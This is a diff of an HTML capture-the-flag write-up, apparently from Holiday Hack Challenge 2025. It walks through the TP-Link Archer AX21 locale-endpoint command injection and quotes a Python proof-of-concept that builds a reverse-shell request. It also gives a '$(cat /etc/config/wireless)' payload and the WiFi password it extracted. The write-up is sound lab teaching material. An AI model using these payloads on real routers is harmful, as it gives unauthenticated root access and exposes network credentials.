@@ -32,10 +32,7 @@ nav: |
 <h2>Solution Overview</h2>
 <br>
 </p>
-<p>
 The objective is to gain access to the router configuration and the password it contains. The target device appears to be running the patched firmware version (1.1.4 Build 20230219), but testing is still required to verify the patch is effective. The vulnerability exists in the <code>/cgi-bin/luci;stok=/locale</code> endpoint where the country parameter is not properly sanitized before being passed to <code>popen()</code>. An unauthenticated attacker can exploit this by sending crafted GET requests to inject commands that execute with root privileges. The exploit requires sending the malicious request twice: the first sets the command and the second executes it. Publicly available proof-of-concept code demonstrates how to obtain a reverse shell using this vulnerability.  In this case, the attack used a simple payload to read the <code>/etc/config/wireless</code> configuration file, which contains wireless network settings including SSIDs and encryption parameters. The exploitation successfully extracted the WiFi password "SprinklesAndPackets2025!" from the router's configuration.
-<br>
-</p>
 <table>
 <thead>
 <tr>
@@ -111,10 +108,7 @@ Device Information
 The logon screen indicates that this is an <strong>Archer AX21 v2.0</strong> running firmware version <strong>1.1.4 Build 20230219</strong>.
 <br>
 </p>
-<p>
 TP-Link Archer AX21 (AX1800) firmware versions before 1.1.4 Build 20230219 contained a command injection vulnerability in the country form of the <code>/cgi-bin/luci;stok=/locale</code> endpoint on the web management interface. Specifically, the country parameter of the write operation was not sanitized before being used in a call to <code>popen()</code>, allowing an unauthenticated attacker to inject commands, which would be run as root, with a simple POST request.
-<br>
-</p>
 <p>
 The following is a recent, known vulnerability. While the firmware version suggests it is patched, it needs to be tested.
 <br>
@@ -194,10 +188,7 @@ url_command = "https://" + args.router + "/cgi-bin/luci/;stok=/locale?form=count
 # Send the URL twice to run the command. Sending twice is necessary for the attack
 r = requests.get(url_command, verify=False)
 r = requests.get(url_command, verify=False)
-<p>
 </code></pre>
-<br>
-</p>
 <p>
 Key portion of the script:
 <br>
@@ -206,10 +197,7 @@ Key portion of the script:
 # URL to obtain the reverse shell
 url_command = "https://" + args.router + "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(" + revshell + ")"
 # Send the URL twice to run the command. Sending twice is necessary for the attack
-<p>
 </code></pre>
-<br>
-</p>
 <p>
 <img src="/HHC_2025/images/dosisnetwork_200.jpg" alt="Testing GET request structure showing 200 OK response">
 <br>
@@ -222,20 +210,14 @@ Work with the structure of the GET request until you get a <strong>200 OK</stron
 Once the structure is verified, insert a payload.
 <br>
 </p>
-<p>
 On the TP-Link Archer AX21, the file <code>/etc/config/wireless</code> is part of the <strong>OpenWrt-style configuration system</strong> used in TP-Link firmware. It stores the <strong>wireless interface definitions</strong> - things like SSIDs, encryption settings, channels, and radio parameters. However, in the stock TP-Link firmware, this file is not normally user-accessible; it's managed internally by the router's web interface and app. If you flash the router with <strong>OpenWrt</strong>, then <code>/etc/config/wireless</code> becomes editable and contains the full wireless configuration in a structured text format.
-<br>
-</p>
 <p>
 The simplest payload is to print the file:
 <br>
 </p>
 <pre><code class="language-">
 $(cat%20/etc/config/wireless)
-<p>
 </code></pre>
-<br>
-</p>
 <p>
 <img src="/HHC_2025/images/dosisnetwork_solution.jpg" alt="Payload execution showing wireless configuration file contents">
 <br>
